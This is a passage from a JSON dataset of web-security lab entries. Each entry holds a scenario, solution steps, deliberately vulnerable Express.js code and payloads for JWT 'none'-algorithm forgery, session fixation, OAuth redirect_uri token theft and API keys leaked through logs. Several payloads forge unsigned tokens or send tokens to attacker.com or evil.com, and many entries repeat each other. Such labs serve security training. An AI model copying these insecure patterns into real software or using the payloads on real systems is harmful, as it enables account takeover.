        "Lab Description": "This lab uses JSON Web Tokens (JWTs) to manage user sessions. The backend fails to validate the `alg` field properly, accepting unsigned tokens when `alg` is set to `none`. The application returns a JWT after login and uses it for accessing protected endpoints. To solve: tamper with the JWT to impersonate Carlos and access his account without valid credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Log in using your own credentials and intercept the POST /login response in Burp Suite to extract your JWT token.",
          "2. Decode the JWT using jwt.io or Burp Decoder. Note the payload and header structure.",
          "3. Modify the JWT header to use \"alg\":\"none\" and change the payload to {\"username\":\"carlos\"}.",
          "4. Remove the JWT signature entirely and base64-encode the new header and payload.",
          "5. Replace your token with the tampered one in the Authorization: Bearer header and send a request to /my-account.",
          "6. If successful, you'll see Carlos's account information, completing the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'carlos123' }, { username: 'guest', password: 'guest123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(400).send('Invalid token'); const username = decoded.payload.username; res.send(`Account info for ${username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{\"alg\":\"none\"}.{\"username\":\"carlos\"}.",
          "Authorization: Bearer [header.payload.]"
        ]
      },
      {
        "Lab scenario": "Session fixation in login flow via GET parameter",
        "Lab Description": "This lab implements session management using a custom session ID passed as a URL parameter and stored as a cookie. However, the session is not regenerated after login, making it vulnerable to session fixation. To solve: set a session ID for Carlos before login and hijack his session after he authenticates.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to initiate a session with a fixed session ID, e.g., GET /login?session=attack123 and observe that it is set as a cookie.",
          "2. Send Carlos a crafted phishing link containing your session ID, like /login?session=attack123.",
          "3. After Carlos logs in, the server reuses the same session ID (no regeneration).",
          "4. Reuse the session ID attack123 in your browser and access /my-account. You'll be logged in as Carlos.",
          "5. Confirm the account switch and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'secret123', alice: 'password' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Login page with session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session; sessions[sid] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (!user) return res.status(403).send('Unauthorized'); res.send(`Welcome ${user}`); }); app.listen(4001, () => console.log('Session Fixation Lab running on port 4001'));",
        "payloads": [
          "/login?session=attack123",
          "Set-Cookie: session=attack123",
          "POST /login with session cookie set to attack123"
        ]
      },
      {
        "Lab scenario": "OAuth token reuse due to lack of client binding",
        "Lab Description": "This lab involves an OAuth flow where the access token is not bound to a specific client application. A malicious actor can reuse a token issued to one client on another. The application does not validate the `aud` or `client_id`. To solve: reuse an access token issued to your app to impersonate Carlos on the victim app.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Authenticate using your own credentials via the OAuth flow in App A and intercept the access token.",
          "2. Note that the token payload contains only the username and expiry, with no client-specific claims.",
          "3. Copy the token and use Postman or Burp to access App B's /my-account endpoint, adding the Authorization: Bearer [token] header.",
          "4. Change the payload of the token to impersonate Carlos (e.g., \"sub\":\"carlos\") and re-sign it using the same shared secret (if known or hardcoded).",
          "5. Send the forged token to App B to access Carlos's account.",
          "6. Success is confirmed when App B responds with Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'shared-oauth-secret'; const users = { carlos: {}, alice: {} }; app.get('/auth', (req, res) => { const user = req.query.user || 'alice'; const token = jwt.sign({ sub: user, exp: Math.floor(Date.now() / 1000) + 3600 }, secret); res.send({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); try { const decoded = jwt.verify(token, secret); res.send(`Account details for ${decoded.sub}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002, () => console.log('OAuth Token Misuse Lab running on port 4002'));",
        "payloads": [
          "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MiLCJleHAiOjE3MDAwMDAwMDB9.[signature]",
          "Authorization: Bearer [reused_token_from_AppA]",
          "jwt.sign({sub:'carlos'}, 'shared-oauth-secret')"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The application initializes a session ID before user authentication and fails to regenerate it after login. The session ID remains fixed, allowing an attacker to hijack authenticated sessions. The application trusts any valid session ID. To solve: Hijack Carlos's authenticated session by forcing him to reuse your crafted session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite Proxy to intercept a GET request to the login page. Notice the Set-Cookie: session=XYZ header.",
          "2. Note the session ID and forward the request to generate a fixed session before login.",
          "3. Use a crafted phishing email (or simulated social engineering) to convince Carlos to log in using your provided session ID (simulate this via cookie manipulation).",
          "4. Once Carlos logs in via that session, reuse the same session ID to access the authenticated /my-account page.",
          "5. Confirm access to Carlos's session by viewing the protected content on his account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { if (!req.cookies.session) res.cookie('session', Math.random().toString(36).substring(2)); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Logged in'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.session) res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Set-Cookie: session=attacker123",
          "https://vulnerable-site.com/login; Cookie: session=attacker123",
          "Cookie injection via phishing link with crafted session"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass using 'none' algorithm",
        "Lab Description": "This application uses JWT for session management but fails to validate the signature algorithm securely. If the 'alg' field in the JWT header is set to 'none', the server skips signature verification. To solve: Forge a JWT with 'alg':'none' and escalate privileges to access Carlos's account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in to your account and inspect the session cookie. Decode the JWT using jwt.io or Burp Decoder.",
          "2. Note the header and payload. The current 'alg' is likely 'HS256'.",
          "3. Modify the JWT header to use 'alg':'none' and change the payload to impersonate carlos.",
          "4. Remove the signature part completely (only use header.payload).",
          "5. Replay the forged JWT as a session cookie and access /my-account to verify Carlos's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const SECRET = 'secret'; app.get('/login', (req, res) => { const token = jwt.sign({ username: 'wiener' }, SECRET); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const user = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (user.username === 'carlos') res.send('Carlos's account info'); else res.send('User account'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }, No signature",
          "JWT with only header.payload format"
        ]
      },
      {
        "Lab scenario": "OAuth token leak in redirect_uri via fragment mismanagement",
        "Lab Description": "The app uses OAuth2 with implicit flow for third-party login. It misuses the redirect_uri allowing an attacker to inject a malicious domain. The access token is returned in the fragment portion of the URI and can be exfiltrated. To solve: Extract Carlos's token by crafting a redirect_uri to a domain under your control.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp Suite to intercept the OAuth flow and inspect the redirect_uri parameter.",
          "2. Craft a redirect_uri pointing to attacker.com/#. The application appends the access_token after the hash.",
          "3. Simulate sending Carlos a link to login via OAuth using the crafted redirect_uri.",
          "4. Capture the access_token from the request at attacker.com using a local server.",
          "5. Replay the access token in a GET request to /my-account with Authorization: Bearer <token> header to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}&token_type=bearer`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-carlos') res.send('Carlos private data'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://oauth-provider.com/auth?redirect_uri=https://attacker.com/",
          "access_token=access-token-carlos",
          "Authorization: Bearer access-token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion vulnerability in login authentication",
        "Lab Description": "The application uses JWT for authentication and is vulnerable due to insecure algorithm handling. It accepts tokens signed with 'none' algorithm if the header is tampered. The application does not verify the integrity of the JWT properly, allowing attackers to forge tokens. To solve: forge a valid token to impersonate the user 'admin' and access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a POST /login request and retrieve your JWT token from the Set-Cookie header.",
          "Decode the JWT using jwt.io or Postman. Observe that the header specifies 'HS256'.",
          "Modify the header to use 'none' as the algorithm and change the payload sub value to 'admin'.",
          "Remove the signature section entirely and re-encode the JWT.",
          "Replace the JWT in your cookie with the tampered token and access /admin-dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = { 'admin': 'adminpass', 'user': 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Logged in'); } else { res.status(403).send('Invalid login'); } }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via referer header in third-party redirect",
        "Lab Description": "The application uses OAuth for login via a third-party provider, but after authentication, it leaks the access token through the Referer header when redirecting to a third-party domain. This token can be captured by any attacker-controlled site in the redirect chain. To solve: capture Carlos's access token and use it to access their profile endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth redirect flow and inspect the Referer headers.",
          "Log in with your own account and observe that the final redirect URL leaks the access_token in the Referer header.",
          "Create an exploit HTML page that initiates the OAuth flow and uses a malicious redirect_uri controlled by you.",
          "Send a crafted OAuth link to Carlos via the built-in message feature to click.",
          "Capture the access token in your server logs and replay it to the /user/profile endpoint to impersonate Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; res.redirect(`http://external-analytics.com/?token=${access_token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Leakage Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://auth.example.com/oauth/authorize?client_id=123&redirect_uri=http://attacker.com&response_type=token",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login redirect",
        "Lab Description": "This application initializes a session before login and uses the same session ID post-login. If an attacker can set a session ID for a victim before they log in, the attacker can hijack the session. To solve: force Carlos to use a session ID you control, then log in as Carlos and access his profile with your fixed session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to initiate a GET /login request and observe the session ID being returned via Set-Cookie.",
          "Craft a link with a fixed session ID using GET /login?session=fixed123 and send this to Carlos through the feedback form.",
          "Once Carlos logs in via that link, he will be assigned session=fixed123.",
          "Use Burp Repeater to replay requests with session=fixed123 and access the /profile endpoint.",
          "Verify you are logged in as Carlos by confirming his email and profile data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sessId = req.query.session || Math.random().toString(36).slice(2); sessions[sessId] = null; res.cookie('session', sessId); res.send('<form method=\"POST\">Username:<input name=\"username\">Password:<input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const sessId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessId] = username; res.redirect('/profile'); } else { res.send('Login failed'); } }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}`); } else { res.status(403).send('Not logged in'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "GET /login?session=fixed123",
          "Cookie: session=fixed123",
          "POST /login with username=carlos&password=supersecure"
        ]
      },
      {
        "Lab scenario": "JWT signature none algorithm tampering in session authentication",
        "Lab Description": "The application uses JWT tokens to manage session state, but fails to validate the token signature algorithm properly. The backend accepts 'none' as a valid algorithm, bypassing token integrity verification. To solve: Forge a valid JWT token for the user 'carlos' and access his account page without needing credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture your JWT after logging in with your own credentials.",
          "2. Decode the JWT using jwt.io or a local tool and observe that the algorithm is set to HS256.",
          "3. Modify the header to use 'alg':'none' and remove the signature part entirely.",
          "4. Change the payload to {\"username\":\"carlos\"} and re-encode the JWT without signing it.",
          "5. Replace your session cookie with the forged token and reload the /account page.",
          "6. Verify access to Carlos's account page, which confirms successful exploitation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'pass123' }]; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); }); app.get('/account', (req, res) => { const token = req.cookies.session; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload && payload.payload.username === 'carlos') res.send('Welcome Carlos!'); else res.send('Access denied'); }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "base64({\"alg\":\"none\"}).base64({\"username\":\"carlos\"})."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration with implicit grant leaking tokens via redirect",
        "Lab Description": "The application uses OAuth with the implicit flow and incorrectly allows redirect URIs to be manipulated, causing access tokens to be leaked to third-party domains. To solve: Capture Carlos’s access token and use it to access his protected profile page via the API.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Intercept the OAuth authorization URL when logging in and notice the use of response_type=token.",
          "2. Modify the redirect_uri parameter to point to an attacker-controlled site (e.g., https://attacker.com/callback).",
          "3. Wait for Carlos to log in and capture the fragment containing the access_token from your server logs.",
          "4. Replay the token in a Bearer authorization header using Postman or Burp Repeater.",
          "5. Send a GET request to /api/profile with the Authorization: Bearer <token> header.",
          "6. Confirm access to Carlos’s profile data to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.send('Unsupported flow'); } }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (auth && auth.includes('token-for-carlos')) res.send('Profile data of Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "https://vulnsite.com/auth?response_type=token&client_id=xyz&redirect_uri=https://evil.com",
          "GET /api/profile HTTP/1.1\\nAuthorization: Bearer token-for-carlos"
        ]
      },
      {
        "Lab scenario": "Session fixation via unvalidated session token reuse",
        "Lab Description": "The login endpoint fails to issue a new session identifier upon successful authentication, allowing an attacker to pre-define a session ID and force it onto a victim. To solve: Fixate Carlos's session ID, get him to log in using it, and hijack the session by accessing his My Account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp to generate a new session ID by visiting the login page anonymously and capturing the Set-Cookie header.",
          "2. Craft a phishing link to login with that specific session ID in the Cookie header and trick Carlos into using it.",
          "3. After Carlos logs in using the fixated session, use the same session ID to access the /my-account endpoint.",
          "4. Confirm successful access by observing Carlos’s account data.",
          "5. Capture a screenshot or extract specific identifiers to verify session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'secret123' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sid = req.cookies.sessionid; sessions[sid] = username; res.send('Logged in'); } else res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos Account Details'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
        "payloads": [
          "Cookie: sessionid=attackerFixedSID",
          "GET /login?username=carlos&password=secret123 HTTP/1.1\\nCookie: sessionid=attackerFixedSID",
          "GET /my-account HTTP/1.1\\nCookie: sessionid=attackerFixedSID"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allows session fixation attack in login flow",
        "Lab Description": "The application implements OAuth 2.0 for third-party authentication, but fails to regenerate the session ID after login. An attacker can fixate a session ID and force the victim to authenticate with it. The application reuses the original session after OAuth login. To solve: Hijack Carlos’s session by initiating login via a pre-fixed session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept /login with Burp Suite and note session cookie before redirect to OAuth provider.",
          "Confirm session ID is retained post OAuth callback via /oauth/callback endpoint.",
          "Craft phishing link that initiates login with fixed session and send it to victim.",
          "Wait for Carlos to authenticate via OAuth; then reuse the same session ID in your browser.",
          "Access /my-account as Carlos with hijacked session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauthStart = true; res.redirect('https://oauth-provider.com/auth'); }); app.get('/oauth/callback', (req, res) => { if (req.session.oauthStart) { req.session.user = 'carlos'; res.redirect('/my-account'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Account details for ' + req.session.user); else res.status(401).send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "GET /login with pre-issued session cookie",
          "Reuse same session cookie after Carlos OAuth login",
          "Access /my-account with hijacked session"
        ]
      },
      {
        "Lab scenario": "JWT token tampering with 'none' algorithm in Authorization header",
        "Lab Description": "The application uses JWTs to control access to user accounts. It does not validate the algorithm field when decoding JWTs. Exploiting this, attackers can replace the token algorithm with 'none' and forge admin tokens. To solve: Modify the token to impersonate Carlos and access /my-account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Capture Authorization: Bearer <token> using OWASP ZAP or Burp Suite.",
          "Decode JWT using jwt.io and inspect the 'alg' header value.",
          "Replace 'alg' with 'none' and set 'sub': 'carlos'.",
          "Remove the signature and re-encode the JWT.",
          "Send modified JWT in Authorization header to /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('Forbidden'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); const payload = jwt.verify(token, secret, { algorithms: [decoded.header.alg] }); res.send('Welcome ' + payload.sub); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"sub\":\"carlos\"}",
          "JWT without signature: base64url(header) + '.' + base64url(payload)"
        ]
      },
      {
        "Lab scenario": "Verbose logging leaks API key allowing unauthorized REST API access",
        "Lab Description": "The REST API backend logs full request headers including Authorization. The verbose debug output is exposed publicly via /logs endpoint. The attacker can extract Carlos’s API key from logs and reuse it for privilege escalation. To solve: Extract and reuse Carlos’s key to access restricted resource.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Browse /logs endpoint and look for recent API request logs.",
          "Identify a log entry containing Authorization header with Bearer token for Carlos.",
          "Copy the leaked token and set it in your API client (Postman).",
          "Send GET /api/private-data with Authorization: Bearer <leaked_token>.",
          "Access Carlos’s restricted data and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const logs = []; app.use((req, res, next) => { logs.push({ path: req.path, headers: req.headers }); next(); }); app.get('/api/private-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-token-123') res.send('Sensitive data for Carlos'); else res.status(403).send('Unauthorized'); }); app.get('/logs', (req, res) => { res.json(logs); }); app.listen(4000);",
        "payloads": [
          "GET /logs -> extract Bearer carlos-token-123",
          "GET /api/private-data with header Authorization: Bearer carlos-token-123"
        ]
      },
      {
        "Lab scenario": "REST-based Session Fixation in Login Flow",
        "Lab Description": "This lab's REST API implements insecure session handling that enables session fixation. The application generates a session ID before login, which is then reused post-authentication. To solve: Hijack a valid user session after fixing the session identifier in the victim's browser.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a GET /session request to capture a pre-authentication session ID.",
          "Send a crafted login link to the victim with the fixed session ID as a cookie via social engineering.",
          "Wait for the victim to authenticate using the fixed session.",
          "Send a request to /my-account using the fixed session cookie to validate session takeover.",
          "Access Carlos's account details to confirm successful exploitation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/session', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session_id', sid); res.send({ message: 'Session initialized' }); }); app.post('/login', (req, res) => { const sid = req.cookies.session_id; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (sid && user) { sessions[sid] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session_id]; if (session && session.authenticated) { res.send('Welcome, ' + session.user); } else { res.status(403).send('Not authorized'); } }); app.listen(4000);",
        "payloads": [
          "Cookie: session_id=FIXED123 before login; use same after login",
          "Social engineering link with fixed session cookie",
          "POST /login with fixed session in header"
        ]
      },
      {
        "Lab scenario": "JWT Authentication Bypass via None Algorithm",
        "Lab Description": "This lab uses JWTs for API authentication but improperly supports the `none` algorithm. This allows an attacker to forge a valid token without signing it. To solve: Generate a forged JWT for the admin user and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite or Postman to intercept an authenticated request and capture a valid JWT.",
          "Decode the JWT using jwt.io and observe the HS256 algorithm in the header.",
          "Modify the header to use \"alg\":\"none\" and payload to {\"username\":\"admin\"}.",
          "Remove the JWT signature and re-encode the token.",
          "Send the forged token in the Authorization header and access /admin-panel to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.send({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Forbidden'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "{\"alg\":\"none\",\"typ\":\"JWT\"}",
          "{\"username\":\"admin\"}",
          "Base64Url(header).Base64Url(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth Redirection Misconfiguration in Authorization Server",
        "Lab Description": "This lab demonstrates an insecure OAuth implementation where the redirect URI is not properly validated. The attacker can intercept the authorization code and exchange it for a token. To solve: Hijack Carlos’s OAuth token by injecting a malicious redirect URI.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to intercept the login flow and observe the /authorize redirect request.",
          "Modify the redirect_uri parameter to a domain you control (e.g., attacker.com).",
          "Host a server to capture the authorization code sent to the malicious redirect URI.",
          "Exchange the stolen code with the /token endpoint using Postman to receive an access token.",
          "Use the token in Authorization header to access /my-account and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { redirect_uri, state } = req.query; const code = 'abc123'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'abc123') res.send({ access_token: 'admin-token' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer admin-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
        "payloads": [
          "https://attacker.com/callback as redirect_uri",
          "POST /token with stolen code",
          "Authorization: Bearer admin-token"
        ]
      },
      {
        "Lab scenario": "JWT Algorithm Confusion in Token Verification",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management but improperly handles the 'alg' field in the token header. Instead of verifying the signature with a secret key, it trusts tokens with 'none' as the algorithm and accepts them without verification. The application grants access if a valid token for 'carlos' is submitted. To solve: Forge a token with alg set to 'none' and impersonate Carlos.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Intercept a request to /my-account using Burp Suite and extract the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or Burp Decoder and note the payload structure.",
          "3. Modify the payload to {\"username\": \"carlos\"} and change the header to {\"alg\": \"none\"}.",
          "4. Remove the signature part entirely and re-encode the token as base64(header).base64(payload).",
          "5. Replay the request with the forged token using Burp Repeater and verify access to Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()).username; return res.send('Access granted to ' + user); } try { const verified = jwt.verify(token, secret); res.send('Access granted to ' + verified.username); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Session Fixation in Login Endpoint",
        "Lab Description": "This application generates a session cookie before login and doesn't renew it post-authentication. This allows an attacker to pre-set a valid session cookie and trick a victim into authenticating using that session. The attacker can then hijack the session to gain access. To solve: Fixate Carlos's session ID, make him log in, then use the same session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Generate a session cookie by accessing the login page and intercepting the response with OWASP ZAP.",
          "2. Craft a phishing link with the pre-set session ID (e.g., /login?sessionid=abc123).",
          "3. Simulate Carlos logging in using the fixed session via Burp Repeater (change session ID in cookie manually).",
          "4. Replay the fixed session cookie to /my-account endpoint.",
          "5. Confirm hijacked session access to Carlos’s account by observing personalized data."
        ],
        "Vulnerability name": "Authentication",
